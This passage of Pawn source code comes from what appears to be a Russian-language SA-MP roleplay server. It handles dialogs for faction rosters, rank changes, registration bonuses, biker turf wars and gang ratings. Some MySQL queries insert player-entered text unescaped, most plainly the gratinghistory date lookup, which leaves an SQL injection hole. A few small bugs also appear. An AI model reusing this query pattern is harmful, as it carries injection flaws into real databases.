	            new stringer[2048];
	            new ss = GetPVarInt(playerid, "off_admin");
	        	if(ss == 0) ss = PlayerInfo[playerid][pMember];
	            mysql_format(DATABASE, QUERY, 128, "SELECT Name,pOnline,pChas,pMin,pRank FROM "TABLE_ACCOUNTS" WHERE pMember='%i'", ss);
				new Cache:result = mysql_query(DATABASE, QUERY);
				new r = cache_num_rows();
				if(r)
				{
				    new bool:label = true;
				    format(stringer, sizeof(stringer), "[#] Имя\tРанг\tПоследний вход\tАктивность за сутки/неделю\n");
					for(new i = GetPVarInt(playerid, "off_list")*29; i < r; i++)
					{
					    if(i%29 == 0)
					    {
					        if(label) label = false;
							else {label = true; break;}
					    }
					    new Names[32], Vxod[32];
						cache_get_field_content(i,"Name",Names,DATABASE,60);
						cache_get_field_content(i,"pOnline",Vxod,DATABASE,32);
						new pChass = cache_get_field_content_int(i, "pChas");
						new pMinn = cache_get_field_content_int(i, "pMin");
						new Rank = cache_get_field_content_int(i,"pRank");
						format(YCMDstr, sizeof(YCMDstr), "[%i] %s\t%i\t%s\t%i / %i часов\n",i, Names, Rank,Vxod,pMinn, pChass);
						strcat(stringer, YCMDstr);
					}

			        if(GetPVarInt(playerid, "off_list") != 0) strcat(stringer, "<< Пред. страница\n");
			        if(label)
			        strcat(stringer, ">> След. страница");
					ShowPlayerDialog(playerid, 19284, DIALOG_STYLE_TABLIST_HEADERS, "Состав оффлайн", stringer, "Выбрать", "Назад");
				}
				return cache_delete(result, DATABASE);
	        }
	        new names[32];
	        GetPVarString(playerid, "offmembers_info", names, 32);
	        switch(listitem)
	        {
				case 0:
				{
				    new ss = GetPVarInt(playerid, "off_admin");
	        		if(ss == 0) ss = PlayerInfo[playerid][pMember];
				    mysql_format(DATABASE, QUERY, 128, "SELECT Name,pOnline,pOnlineLid,pChas,pMin,pRank FROM "TABLE_ACCOUNTS" WHERE pMember='%i' AND Name = '%s'", ss, names);
					new Cache:result = mysql_query(DATABASE, QUERY);
					new r = cache_num_rows();
					if(r)
					{
					    new Vxod[32], Inv[32];
					    cache_get_field_content(0,"pOnline",Vxod,DATABASE,32);
					    cache_get_field_content(0,"pOnlineLid",Inv,DATABASE,32);
						new pChass = cache_get_field_content_int(0, "pChas");
						new pMinn = cache_get_field_content_int(0, "pMin");
						new Rank = cache_get_field_content_int(0,"pRank");
						format(string, sizeof(string), "Имя: %s\nРанг: %i\nДата вступления: %s\nДата посл.входа: %s\nАктивность. Часов за сутки/неделю: %i/%i", names, Rank, Inv, Vxod, pMinn, pChass);
						ShowPlayerDialog(playerid, 19286, DIALOG_STYLE_MSGBOX, "Сообщение", string, "Выбрать", "Назад");
					}
					return cache_delete(result, DATABASE);
				}
				case 1:
				{
				    format(string, sizeof(string), "Введите новый ранг игрока %s", names);
				    ShowPlayerDialog(playerid, 19287, DIALOG_STYLE_INPUT, "Ввод параметра", string, "Далее", "Назад");
				    return true;
				}
				case 2:
				{
					format(string, sizeof(string), "Вы действительно хотите выгнать %s из организации?", names);
				    ShowPlayerDialog(playerid, 19288, DIALOG_STYLE_MSGBOX, "Сообщение", string, "Далее", "Назад");
				}
	        }
	    }
	case 19286:
		{
		    new names[32];
			GetPVarString(playerid, "offmembers_info", names, 32);
			ShowPlayerDialog(playerid, 19285, DIALOG_STYLE_LIST, names, "[0] Информация\n[1] Повысить/Понизить\n[2] Уволить", "Выбор", "Назад");
			return true;
		}
	case 19287:
	    {
	        if(!response)
			{
				new names[32];
				GetPVarString(playerid, "offmembers_info", names, 32);
				ShowPlayerDialog(playerid, 19285, DIALOG_STYLE_LIST, names, "[0] Информация\n[1] Повысить/Понизить\n[2] Уволить", "Выбор", "Назад");
				return true;
			}
	        if(strlen(inputtext) == 0)
			{
				new names[32];
		        GetPVarString(playerid, "offmembers_info", names, 32);
	        	format(string, sizeof(string), "Введите новый ранг игрока %s", names);
			    ShowPlayerDialog(playerid, 19287, DIALOG_STYLE_INPUT, "Ввод параметра", string, "Далее", "Назад");
			    return true;
	        }
			new rank = strval(inputtext);
			new bool:label = false;
			switch(PlayerInfo[playerid][pMember])
			{
			    case 1,10,21:
				{
					switch(rank) { case 1..13: {} default: { SCM(playerid, COLOR_GREY, " Нельзя меньше 1 и больше 13"); label = true; } }
				}
			    case 2,4,5,6,9,11,12,13,14,15,16,17,18,20,24,26,29:
				{
		            switch(rank) { case 1..9: {} default: { SCM(playerid, COLOR_GREY, " Нельзя меньше 1 и больше 9"); label = true; } }
				}
			    case 3,19:
				{
				    switch(rank) { case 1..14: {} default: { SCM(playerid, COLOR_GREY, " Нельзя меньше 1 и больше 14"); label = true; } }
				}
			    case 7:
				{
					switch(rank) { case 1..9: {} default: { SCM(playerid, COLOR_GREY, " Нельзя меньше 1 и больше 9"); label = true; } }
				}
			}
			if(label)
			{
				new names[32];
		        GetPVarString(playerid, "offmembers_info", names, 32);
	        	format(string, sizeof(string), "Введите новый ранг игрока %s", names);
			    ShowPlayerDialog(playerid, 19287, DIALOG_STYLE_INPUT, "Ввод параметра", string, "Далее", "Назад");
			    return true;
			}
			new names[32];
   			GetPVarString(playerid, "offmembers_info", names, 32);
			format(string, sizeof(string), "/offgiverank %s %i",names, rank);
			CallLocalFunction("OnPlayerCommandText", "is", playerid, string);
			return ShowPlayerDialog(playerid, 19285, DIALOG_STYLE_LIST, names, "[0] Информация\n[1] Повысить/Понизить\n[2] Уволить", "Выбор", "Назад");
		}
	case 19288:
	    {
	        new names[32];
   			GetPVarString(playerid, "offmembers_info", names, 32);
	    	if(!response) return ShowPlayerDialog(playerid, 19285, DIALOG_STYLE_LIST, names, "[0] Информация\n[1] Повысить/Понизить\n[2] Уволить", "Выбор", "Назад");
	    	format(string, sizeof(string), "/offuninvite %s",names);
			CallLocalFunction("OnPlayerCommandText", "is", playerid, string);
			new stringer[2048];
			new ss = GetPVarInt(playerid, "off_admin");
	        if(ss == 0) ss = PlayerInfo[playerid][pMember];
            mysql_format(DATABASE, QUERY, 128, "SELECT Name,pOnline,pChas,pMin,pRank FROM "TABLE_ACCOUNTS" WHERE pMember='%i'", ss);
			new Cache:result = mysql_query(DATABASE, QUERY);
			new r = cache_num_rows();
			if(r)
			{
			    new bool:label = true;
			    format(stringer, sizeof(stringer), "[#] Имя\tРанг\tПоследний вход\tАктивность за сутки/неделю\n");
				for(new i = GetPVarInt(playerid, "off_list")*29; i < r; i++)
				{
				    if(i%29 == 0)
				    {
				        if(label) label = false;
						else {label = true; break;}
				    }
				    new Names[32], Vxod[32];
					cache_get_field_content(i,"Name",Names,DATABASE,60);
					cache_get_field_content(i,"pOnline",Vxod,DATABASE,32);
					new pChass = cache_get_field_content_int(i, "pChas");
					new pMinn = cache_get_field_content_int(i, "pMin");
					new Rank = cache_get_field_content_int(i,"pRank");
					format(YCMDstr, sizeof(YCMDstr), "[%i] %s\t%i\t%s\t%i / %i часов\n",i, Names, Rank,Vxod,pMinn, pChass);
					strcat(stringer, YCMDstr);
				}

		        if(GetPVarInt(playerid, "off_list") != 0) strcat(stringer, "<< Пред. страница\n");
		        if(label)
		        strcat(stringer, ">> След. страница");
				ShowPlayerDialog(playerid, 19284, DIALOG_STYLE_TABLIST_HEADERS, "Состав оффлайн", stringer, "Выбрать", "Назад");
			}
			return cache_delete(result, DATABASE);
	    }
	case 13954:
	    {
	        if(!response) return true;
	        new strs[32];
	        
	        if(!strcmp(inputtext, "Купить оружие", true))
	        {
	            strs = "gun";
	        }
	        else if(!strcmp(inputtext, "Крыша", true))
	        {
				strs = "debt";
	        }
	        else if(!strcmp(inputtext, "Свадьба", true))
	        {
				strs = "propose";
	        }
	        else if(!strcmp(inputtext, "Контракт", true))
	        {
				strs = "gcontract";
	        }
	        else if(!strcmp(inputtext, "Штраф", true))
	        {
				strs = "ticket";
	        }
	        else if(!strcmp(inputtext, "Наркотики", true))
	        {
				strs = "drugs";
	        }
	        else if(!strcmp(inputtext, "Бой", true))
	        {
				strs = "fight";
	        }
	        else if(!strcmp(inputtext, "Покупка дома", true))
	        {
				strs = "house";
	        }
	        else if(!strcmp(inputtext, "Заправка", true))
	        {
				strs = "refill";
	        }
	        else if(!strcmp(inputtext, "Починка", true))
	        {
				strs = "repair";
	        }
	        else if(!strcmp(inputtext, "Территории", true))
	        {
				strs = "zone";
	        }
	        else if(!strcmp(inputtext, "Ключи от камеры", true))
	        {
				strs = "ekey";
	        }
			else if(!strcmp(inputtext, "Выход из тюрьмы", true))
	        {
				strs = "free";
	        }
			else if(!strcmp(inputtext, "Хот Дог", true))
	        {
				strs = "eat";
	        }
	        format(string, sizeof(string), "/accept %s",strs);
	        CallLocalFunction("OnPlayerCommandText", "is", playerid, string);
	        CallLocalFunction("OnPlayerCommandText", "is", playerid, "/accept");
	    }
	case 11486:
	    {
	        if(!response) return true;
	        new strs[128];
	        GetPVarString(playerid, "achat", strs, sizeof(strs));
	        DeletePVar(playerid, "achat");
	        switch(listitem)
	        {
	            case 0: SetPVarInt(playerid, "achat", 1), SCM(playerid, -1, " Теперь вы будете писать в обычный чат администраторов");
	            case 1: SetPVarInt(playerid, "achat", 2), SCM(playerid, -1, " Теперь вы будете писать в чат спец. администраторов");
	        }
	        if(strlen(strs) != 0)
	        {
				format(string, sizeof(string), "/a %s", strs);
				CallLocalFunction("OnPlayerCommandText", "is", playerid, string);
	        }
	    }
	case 11052:
	    {
	        if(!response) return true;
	        if(!GetPVarInt(playerid, "Fraction_Duty"))
	        {
		        switch(listitem)
		        {
		            case 0: PlayerInfo[playerid][pSpawnChange][0] = 0;
		            case 1: PlayerInfo[playerid][pSpawnChange][0] = 1;
		        }
	        }
	        else
	        {
		        switch(listitem)
		        {
		            case 0: PlayerInfo[playerid][pSpawnChange][1] = 0;
		            case 1: PlayerInfo[playerid][pSpawnChange][1] = 1;
		        }
				if(PlayerInfo[playerid][pMember] == 4)
				{
				    PlayerInfo[playerid][pJobHeal] = listitem;
				}
	        }
        	mysql_format(DATABASE,QUERY,300, "UPDATE `"TABLE_ACCOUNTS"` SET pSpawnChange = '%i,%i' WHERE name = '%e'", PlayerInfo[playerid][pSpawnChange][0], PlayerInfo[playerid][pSpawnChange][1], PlayerInfo[playerid][pName]);
            mysql_function_query(DATABASE,QUERY,false,"","");
	        SCM(playerid, -1, " Изменения приняты");
	    }
	    case 5254:
		{
		    if(!response) return true;
		    switch(listitem)
		    {
		        case 0..2:
		        {
		            SetPVarInt(playerid, "serverBonus", listitem);
					ShowPlayerDialog(playerid, 5255, DIALOG_STYLE_INPUT, "Ввод параметра", "Введите значение", "Далее", "Назад");
					return true;
		        }
		        case 3: // pDirectory
		        {
                    mysql_format(DATABASE, QUERY, sizeof(QUERY), "SELECT COLUMN_DEFAULT FROM INFORMATION_SCHEMA.columns WHERE `TABLE_name` = 'accounts' AND`COLUMN_NAME` = 'pDirectory'");
					mysql_query(DATABASE, QUERY);
					new r = cache_num_rows();
					if(r)
					{
						new def[64];
						cache_get_field_content(1,"COLUMN_DEFAULT",def,DATABASE,sizeof(def));
						switch(strval(def))
						{
						    case 0:
						    {
								mysql_function_query(DATABASE,"ALTER TABLE `accounts` ALTER COLUMN `pDirectory` SET DEFAULT '1'",false,"","");
                                SCM(playerid, -1, " Вы включили выдачу телефонного справочника при регистрации");
						    }
						    case 1:
						    {
						    	mysql_function_query(DATABASE,"ALTER TABLE `accounts` ALTER COLUMN `pDirectory` SET DEFAULT '0'",false,"","");
                                SCM(playerid, -1, " Вы отключили выдачу телефонного справочника при регистрации");
						    }
						}
					}
		        }
                case 4: // pCarLic
		        {
                    mysql_format(DATABASE, QUERY, sizeof(QUERY), "SELECT COLUMN_DEFAULT FROM INFORMATION_SCHEMA.columns WHERE `TABLE_name` = 'accounts' AND\
					`COLUMN_NAME` = 'pCarLic'");
					mysql_query(DATABASE, QUERY);
					new r = cache_num_rows();
					if(r)
					{
						new def[64];
						cache_get_field_content(1,"COLUMN_DEFAULT",def,DATABASE,sizeof(def));
						switch(strval(def))
						{
						    case 0:
						    {
								mysql_function_query(DATABASE,"ALTER TABLE `accounts` ALTER COLUMN `pCarLic` SET DEFAULT '1'",false,"","");
                                SCM(playerid, -1, " Вы включили выдачу водительских прав при регистрации");
						    }
						    case 1:
						    {
						    	mysql_function_query(DATABASE,"ALTER TABLE `accounts` ALTER COLUMN `pCarLic` SET DEFAULT '0'",false,"","");
                                SCM(playerid, -1, " Вы отключили выдачу водительских прав при регистрации");
						    }
						}
					}
		        }
		        case 5: // pFlyLic
		        {
                    mysql_format(DATABASE, QUERY, sizeof(QUERY), "SELECT COLUMN_DEFAULT FROM INFORMATION_SCHEMA.columns WHERE `TABLE_name` = 'accounts' AND\
					`COLUMN_NAME` = 'pFlyLic'");
					mysql_query(DATABASE, QUERY);
					new r = cache_num_rows();
					if(r)
					{
						new def[64];
						cache_get_field_content(1,"COLUMN_DEFAULT",def,DATABASE,sizeof(def));
						switch(strval(def))
						{
						    case 0:
						    {
								mysql_function_query(DATABASE,"ALTER TABLE `accounts` ALTER COLUMN `pFlyLic` SET DEFAULT '1'",false,"","");
                                SCM(playerid, -1, " Вы включили выдачу лицензии на полёты при регистрации");
						    }
						    case 1:
						    {
						    	mysql_function_query(DATABASE,"ALTER TABLE `accounts` ALTER COLUMN `pFlyLic` SET DEFAULT '0'",false,"","");
                                SCM(playerid, -1, " Вы отключили выдачу лицензии на полёты при регистрации");
						    }
						}
					}
		        }
		        case 6: // pBoatLic
		        {
                    mysql_format(DATABASE, QUERY, sizeof(QUERY), "SELECT COLUMN_DEFAULT FROM INFORMATION_SCHEMA.columns WHERE `TABLE_name` = 'accounts' AND\
					`COLUMN_NAME` = 'pBoatLic'");
					mysql_query(DATABASE, QUERY);
					new r = cache_num_rows();
					if(r)
					{
						new def[64];
						cache_get_field_content(1,"COLUMN_DEFAULT",def,DATABASE,sizeof(def));
						switch(strval(def))
						{
						    case 0:
						    {
								mysql_function_query(DATABASE,"ALTER TABLE `accounts` ALTER COLUMN `pBoatLic` SET DEFAULT '1'",false,"","");
                                SCM(playerid, -1, " Вы включили выдачу лицензии на водный транспорт при регистрации");
						    }
						    case 1:
						    {
						    	mysql_function_query(DATABASE,"ALTER TABLE `accounts` ALTER COLUMN `pBoatLic` SET DEFAULT '0'",false,"","");
                                SCM(playerid, -1, " Вы отключили выдачу лицензии на водный транспорт при регистрации");
						    }
						}
					}
		        }
		        case 7: // pFishLic
		        {
                    mysql_format(DATABASE, QUERY, sizeof(QUERY), "SELECT COLUMN_DEFAULT FROM INFORMATION_SCHEMA.columns WHERE `TABLE_name` = 'accounts' AND\
					`COLUMN_NAME` = 'pFishLic'");
					mysql_query(DATABASE, QUERY);
					new r = cache_num_rows();
					if(r)
					{
						new def[64];
						cache_get_field_content(1,"COLUMN_DEFAULT",def,DATABASE,sizeof(def));
						switch(strval(def))
						{
						    case 0:
						    {
								mysql_function_query(DATABASE,"ALTER TABLE `accounts` ALTER COLUMN `pFishLic` SET DEFAULT '1'",false,"","");
                                SCM(playerid, -1, " Вы включили выдачу лицензии на рыболовлю при регистрации");
						    }
						    case 1:
						    {
						    	mysql_function_query(DATABASE,"ALTER TABLE `accounts` ALTER COLUMN `pFishLic` SET DEFAULT '0'",false,"","");
                                SCM(playerid, -1, " Вы отключили выдачу лицензии на рыболовлю при регистрации");
						    }
						}
					}
		        }
		        case 8: // pGunLic
		        {
                    mysql_format(DATABASE, QUERY, sizeof(QUERY), "SELECT COLUMN_DEFAULT FROM INFORMATION_SCHEMA.columns WHERE `TABLE_name` = 'accounts' AND\
					`COLUMN_NAME` = 'pGunLic'");
					mysql_query(DATABASE, QUERY);
					new r = cache_num_rows();
					if(r)
					{
						new def[64];
						cache_get_field_content(1,"COLUMN_DEFAULT",def,DATABASE,sizeof(def));
						switch(strval(def))
						{
						    case 0:
						    {
								mysql_function_query(DATABASE,"ALTER TABLE `accounts` ALTER COLUMN `pGunLic` SET DEFAULT '1'",false,"","");
                                SCM(playerid, -1, " Вы включили выдачу лицензии на оружие при регистрации");
						    }
						    case 1:
						    {
						    	mysql_function_query(DATABASE,"ALTER TABLE `accounts` ALTER COLUMN `pGunLic` SET DEFAULT '0'",false,"","");
                                SCM(playerid, -1, " Вы отключили выдачу лицензии на оружие при регистрации");
						    }
						}
					}
		        }
		        case 9: // pGunSkills
		        {
                    mysql_format(DATABASE, QUERY, sizeof(QUERY), "SELECT COLUMN_DEFAULT FROM INFORMATION_SCHEMA.columns WHERE `TABLE_name` = 'accounts' AND\
					`COLUMN_NAME` = 'pGunSkills'");
					mysql_query(DATABASE, QUERY);
					new r = cache_num_rows();
					if(r)
					{
						new def[64];
						cache_get_field_content(1,"COLUMN_DEFAULT",def,DATABASE,sizeof(def));
						if(!strcmp(def, "0, 0, 0, 0, 0, 0"))
						{
							mysql_function_query(DATABASE,"ALTER TABLE `accounts` ALTER COLUMN `pGunSkills` SET DEFAULT '100, 100, 100, 100, 100, 100'",false,"","");
       						SCM(playerid, -1, " Вы включили выдачу навыка владения оружием при регистрации");
						}
						else if(!strcmp(def, "100, 100, 100, 100, 100, 100"))
						{
							mysql_function_query(DATABASE,"ALTER TABLE `accounts` ALTER COLUMN `pGunSkills` SET DEFAULT '0, 0, 0, 0, 0, 0'",false,"","");
       						SCM(playerid, -1, " Вы отключили выдачу навыка владения оружием при регистрации");
						}
					}
		        }
		    }
			CallLocalFunction("OnPlayerCommandText", "is", playerid, "/serverbonus");
		}
	case 5255:
	    {
	        if(!response) return CallLocalFunction("OnPlayerCommandText", "is", playerid, "/serverbonus");
			if(GetPVarInt(playerid, "serverBonus") == 0) // pLevel
			{
				if(strlen(inputtext) == 0 || strval(inputtext) < 1 || strval(inputtext) > 1000)
				{
		            return ShowPlayerDialog(playerid, 5255, DIALOG_STYLE_INPUT, "Ввод параметра", "Введите значение", "Далее", "Назад");
				}
				mysql_format(DATABASE, QUERY, 128, "ALTER TABLE `accounts` ALTER COLUMN `pLevel` SET DEFAULT '%i'",strval(inputtext));
				mysql_function_query(DATABASE,QUERY,false,"","");
				SendMes(playerid, -1, " Вы изменили начальный уровень при регистрации на %i", strval(inputtext));
			}
			else if(GetPVarInt(playerid, "serverBonus") == 1) // pBank
			{
				if(strlen(inputtext) == 0 || strval(inputtext) < 0 || strval(inputtext) > 999999999)
				{
		            return ShowPlayerDialog(playerid, 5255, DIALOG_STYLE_INPUT, "Ввод параметра", "Введите значение", "Далее", "Назад");
				}
				mysql_format(DATABASE, QUERY, 128, "ALTER TABLE `accounts` ALTER COLUMN `pBank` SET DEFAULT '%i'",strval(inputtext));
				mysql_function_query(DATABASE,QUERY,false,"","");
				SendMes(playerid, -1, " Вы изменили начальные деньги в банке при регистрации на %i", strval(inputtext));
			}
			else if(GetPVarInt(playerid, "serverBonus") == 2) // pCash
			{
				if(strlen(inputtext) == 0 || strval(inputtext) < 0 || strval(inputtext) > 999999999)
				{
		            return ShowPlayerDialog(playerid, 5255, DIALOG_STYLE_INPUT, "Ввод параметра", "Введите значение", "Далее", "Назад");
				}
				mysql_format(DATABASE, QUERY, 128, "ALTER TABLE `accounts` ALTER COLUMN `pCash` SET DEFAULT '%i'",strval(inputtext));
				mysql_function_query(DATABASE,QUERY,false,"","");
				SendMes(playerid, -1, " Вы изменили начальные деньги на руках при регистрации на %i", strval(inputtext));
			}
			CallLocalFunction("OnPlayerCommandText", "is", playerid, "/serverbonus");
	    }
	case 19270:
	    {
	        if(!response) return true;
	        switch(listitem)
	        {
	            case 0..4:
				{
				    if(FarmInfo[listitem+1][isCaptured])
				    {
				        return SCM(playerid, COLOR_GREY, " За этот бизнес уже была война!");
				    }
				    if(FarmInfo[listitem+1][fBiker] == 0)
				    {
				        if(IsCaptedBiker(PlayerInfo[playerid][pMember]) == 1) return SCM(playerid, COLOR_GREY, " Вы уже воевали недавно. Попробуйте через пару часов.");
						FarmInfo[listitem+1][fBiker] = PlayerInfo[playerid][pMember];
				        format(string, sizeof(string), " Вы завладели Фермой №%i", listitem);
				        SendFamilyMessage(PlayerInfo[playerid][pMember], COLOR_GREEN, string);
				        SetTimer("CanCaptBiker",7200000, true);
				        FarmInfo[listitem+1][isCaptured] = true;
				        switch(PlayerInfo[playerid][pMember])
						{
						    case 24: IsCapted[hells] = true;
						    case 26: IsCapted[warloks] = true;
						    case 29: IsCapted[pagans] = true;
						}
				        return true;
				    }
				    else if(PlayerInfo[playerid][pMember] != FarmInfo[listitem][fBiker])
				    {
				        if(BikerCapture[atack] == 0 && BikerCapture[other] == 0)
				        {
							if(IsCaptedBiker(PlayerInfo[playerid][pMember]) == 1) return SCM(playerid, COLOR_GREY, " Вы уже воевали недавно. Попробуйте через пару часов.");
							if(IsCaptedBiker(FarmInfo[listitem+1][fBiker]) == 1) return SCM(playerid, COLOR_GREY, " Этот клуб уже воевал недавно. Попробуйте через пару часов.");
							BikerCapture[atack] = PlayerInfo[playerid][pMember];
				            BikerCapture[other] = FarmInfo[listitem+1][fBiker];
				            BikerCapture[reasons] = listitem;
				            format(string, sizeof(string), " Вы объявили войну %s! Начало через 15 минут.", GetNameOfBiker(FarmInfo[listitem+1][fBiker]));
				            SendFamilyMessage(BikerCapture[atack], COLOR_GREEN, string);
				            format(string, sizeof(string), " Вам объявили войну %s! Начало через 15 минут. Ваша задача удержать зону, отмеченную на карте", GetNameOfBiker(FarmInfo[listitem+1][fBiker]));
				            SendFamilyMessage(BikerCapture[other], COLOR_REDD, string);
				            BikerCapt(BikerCapture[atack], BikerCapture[other]);
							switch(BikerCapture[atack])
							{
							    case 24: IsCapted[hells] = true;
							    case 26: IsCapted[warloks] = true;
							    case 29: IsCapted[pagans] = true;
							}
							switch(BikerCapture[other])
							{
							    case 24: IsCapted[hells] = true;
							    case 26: IsCapted[warloks] = true;
							    case 29: IsCapted[pagans] = true;
							}
							SetTimer("CanCaptBiker", 7200000, true);
							SetTimer("StopCaptureBiker", 900000, true);
							FarmInfo[listitem+1][isCaptured] = true;
				        }
				    }
				    else if(PlayerInfo[playerid][pMember] == FarmInfo[listitem][fBiker]) return SCM(playerid, COLOR_GREY, " Этот бизнес ваш!");
				}
				case 5..7:
				{
				    new list = listitem - 5;
				    if(WorkshopInfo[list+1][isCaptured])
				    {
				        return SCM(playerid, COLOR_GREY, " За этот бизнес уже была война!");
				    }
				    if(WorkshopInfo[list+1][wBiker] == 0)
				    {
						if(IsCaptedBiker(PlayerInfo[playerid][pMember]) == 1) return SCM(playerid, COLOR_GREY, " Вы уже воевали недавно. Попробуйте через пару часов.");
						WorkshopInfo[list+1][wBiker] = PlayerInfo[playerid][pMember];
				        format(string, sizeof(string), " Вы завладели Мастерской №%i", list);
				        SendFamilyMessage(PlayerInfo[playerid][pMember], COLOR_GREEN, string);
				        SetTimer("CanCaptBiker",7200000, true);
				        WorkshopInfo[list+1][isCaptured] = true;
				        switch(PlayerInfo[playerid][pMember])
						{
						    case 24: IsCapted[hells] = true;
						    case 26: IsCapted[warloks] = true;
						    case 29: IsCapted[pagans] = true;
						}
				        return true;
				    }
				    else if(PlayerInfo[playerid][pMember] != WorkshopInfo[list+1][wBiker])
				    {
				        if(BikerCapture[atack] == 0 && BikerCapture[other] == 0)
				        {
                            if(IsCaptedBiker(PlayerInfo[playerid][pMember]) == 1) return SCM(playerid, COLOR_GREY, " Вы уже воевали недавно. Попробуйте через пару часов.");
							if(IsCaptedBiker(WorkshopInfo[list+1][wBiker]) == 1) return SCM(playerid, COLOR_GREY, " Этот клуб уже воевал недавно. Попробуйте через пару часов.");
							BikerCapture[atack] = PlayerInfo[playerid][pMember];
				            BikerCapture[other] = WorkshopInfo[list+1][wBiker];
				            BikerCapture[reasons] = list;
				            format(string, sizeof(string), " Вы объявили войну %s! Начало через 15 минут.", GetNameOfBiker(WorkshopInfo[list+1][wBiker]));
				            SendFamilyMessage(BikerCapture[atack], COLOR_GREEN, string);
				            format(string, sizeof(string), " Вам объявили войну %s! Начало через 15 минут. Ваша задача удержать зону, отмеченную на карте", GetNameOfBiker(WorkshopInfo[list+1][wBiker]));
				            SendFamilyMessage(BikerCapture[other], COLOR_REDD, string);
				            BikerCapt(BikerCapture[atack], BikerCapture[other]);
				            switch(BikerCapture[atack])
							{
							    case 24: IsCapted[hells] = true;
							    case 26: IsCapted[warloks] = true;
							    case 29: IsCapted[pagans] = true;
							}
							switch(BikerCapture[other])
							{
							    case 24: IsCapted[hells] = true;
							    case 26: IsCapted[warloks] = true;
							    case 29: IsCapted[pagans] = true;
							}
							SetTimer("CanCaptBiker", 7200000, true);
							SetTimer("StopCaptureBiker", 900000, true);
							WorkshopInfo[list+1][isCaptured] = true;
				        }
				    }
				    else if(PlayerInfo[playerid][pMember] == WorkshopInfo[list+1][wBiker]) return SCM(playerid, COLOR_GREY, " Этот бизнес ваш!");
				}
	        }
	    }
	case 5693:
	    {
	        if(!response) return true;
	        switch(listitem)
	        {
	            case 0:
	            {
	                format(string, sizeof(string), "Имя\t\tОчки\n\
													[0] Rifa\t\t%i\n\
													[1] Grove street\t\t%i\n\
													[2] Ballas\t\t%i\n\
													[3] Vagos\t\t%i\n\
													[4] Aztec\t\t%i\n",
													gRating[Rifa], gRating[Grove], gRating[Ballas], gRating[Vagos], gRating[Aztec]);
             		ShowPlayerDialogEx(playerid, 5694, DIALOG_STYLE_TABLIST_HEADERS, "Банды", string, "Выбрать", "Назад");
	            }
	            case 1:
	            {
	                new Names[32], query[1028], gratings;
	                format(query, sizeof(query), "Имя\t\tОчки\nМой рейтинг\t\t%i\n", PlayerInfo[playerid][pGRating]);
	                mysql_format(DATABASE, QUERY, 62, "SELECT `Name`,`grating` FROM `"TABLE_ACCOUNTS"` WHERE `grating` > '0'");
					mysql_query(DATABASE, QUERY);
					new r = cache_num_rows();
					if(r)
					{
						for(new i = 0; i < r; i++)
						{
							new strin[40];
							cache_get_field_content(i,"Name",Names,DATABASE,60);
							gratings = cache_get_field_content_int(i, "grating");
				            format(strin,sizeof(strin),"[%i] %s\t%i\n",i, Names, gratings);
							strcat(query, strin);
						}
					}
					ShowPlayerDialogEx(playerid, 5695, DIALOG_STYLE_TABLIST_HEADERS, "Игроки", query, "Выбрать", "Назад");
	            }
	            case 2:
	            {
	                new sdate[32], query[128];
	                mysql_format(DATABASE, QUERY, 62, "SELECT date FROM `gratinghistory`");
					mysql_query(DATABASE, QUERY);
					new r = cache_num_rows();
					if(r)
					{
						for(new i = 0; i < r; i++)
						{
							new strin[40];
							cache_get_field_content(i,"date",sdate,DATABASE,32);
				            format(strin,sizeof(strin),"%s\n", sdate, grating);
							strcat(query, strin);
						}
					}
					ShowPlayerDialogEx(playerid, 5696, DIALOG_STYLE_LIST, "История", query, "Выбрать", "Назад");
	            }
	        }
	    }
	case 5694:
	    {
			if(response)
			{
				format(string, sizeof(string), "Имя\t\tОчки\n\
													[0] Rifa\t\t%i\n\
													[1] Grove street\t\t%i\n\
													[2] Ballas\t\t%i\n\
													[3] Vagos\t\t%i\n\
													[4] Aztec\t\t%i\n",
													gRating[Rifa], gRating[Grove], gRating[Ballas], gRating[Vagos], gRating[Aztec]);
           		ShowPlayerDialogEx(playerid, 5694, DIALOG_STYLE_TABLIST_HEADERS, "Банды", string, "Выбрать", "Назад");
  			}
  			else if(!response)
  			{
  			    CallLocalFunction("OnPlayerCommandText", "is", playerid, "/grating");
  			}
	    }
	case 5695:
	    {
	    	if(response)
			{
				new Names[32], query[1028], gratings;
                format(query, sizeof(query), "Имя\t\tОчки\nМой рейтинг\t\t%i\n", PlayerInfo[playerid][pGRating]);
                mysql_format(DATABASE, QUERY, 62, "SELECT `Name`,`grating` FROM `"TABLE_ACCOUNTS"` WHERE `grating` > '0'");
				mysql_query(DATABASE, QUERY);
				new r = cache_num_rows();
				if(r)
				{
					for(new i = 0; i < r; i++)
					{
						new strin[40];
						cache_get_field_content(i,"Name",Names,DATABASE,60);
						gratings = cache_get_field_content_int(i, "grating");
			            format(strin,sizeof(strin),"[%i] %s\t%i\n",i, Names, gratings);
						strcat(query, strin);
					}
				}
				ShowPlayerDialogEx(playerid, 5695, DIALOG_STYLE_TABLIST_HEADERS, "Игроки", query, "Выбрать", "Назад");
  			}
  			else if(!response)
  			{
  			    CallLocalFunction("OnPlayerCommandText", "is", playerid, "/grating");
  			}
	    }
	case 5696:
	    {
	        if(!response) return CallLocalFunction("OnPlayerCommandText", "is", playerid, "/grating");
            new query[512], player[32], playerMark, agGrove, agBallas, agRifa, agAztec, agVagos;
            format(query, sizeof(query), "Имя\t\tОчки\n[0] [ЛУЧШИЙ ИГРОК]\n");
            mysql_format(DATABASE, QUERY, 62, "SELECT * FROM `gratinghistory` WHERE date = '%s'", inputtext);
			mysql_query(DATABASE, QUERY);
			SetPVarString(playerid, "grhistory", inputtext);
			new r = cache_num_rows();
			if(r)
			{
				new strin[512];
				cache_get_field_content(0,"player",player,DATABASE,60);
				playerMark = cache_get_field_content_int(0, "playerMark");
	            format(strin,sizeof(strin),"[1] %s\t\t%i\n[2] [БАНДЫ]\n", player, playerMark);
				strcat(query, strin);
				agGrove = cache_get_field_content_int(0, "Grove street");
				agBallas = cache_get_field_content_int(0, "Ballas");
				agRifa = cache_get_field_content_int(0, "Rifa");
				agAztec = cache_get_field_content_int(0, "Aztec");
				agVagos = cache_get_field_content_int(0, "Vagos");
				format(strin, sizeof(strin), "[3] Grove street\t\t%i\n\
	   										  [4] Ballas\t\t%i\n\
	   										  [5] Rifa\t\t%i\n\
	   										  [6] Aztec\t\t%i\n\
	   										  [7] Vagos\t\t%i\n",agGrove, agBallas, agRifa, agAztec, agVagos);
				strcat(query, strin);
			} else printf("Нет даных в gratinghistory");
			ShowPlayerDialogEx(playerid, 5697, DIALOG_STYLE_TABLIST_HEADERS, "Меню", query, "Выбрать", "Назад");
	    }
	case 5697:
	    {
	        if(!response)
